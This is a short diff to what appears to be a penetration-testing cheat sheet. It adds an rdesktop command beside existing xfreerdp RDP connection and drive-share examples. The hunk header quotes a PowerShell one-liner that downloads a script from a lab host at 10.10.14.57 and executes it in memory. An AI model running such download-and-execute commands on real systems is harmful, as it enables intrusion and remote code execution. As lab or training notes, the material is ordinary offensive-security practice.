@@ -26,6 +26,11 @@ powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.57:800
 ```sh
 xfreerdp /v:<server_ip> /u:<username> /p:<password> +dynamic-resolution +clipboard
 ```
+
+```sh
+rdesktop <IP>
+```
+
 ## RDP with SMB Share
 ```sh
 xfreerdp3 /v:$target /u:'username' /p:'password' /cert:ignore +clipboard /dynamic-resolution /drive:/home/kali/Transfer,kalishare
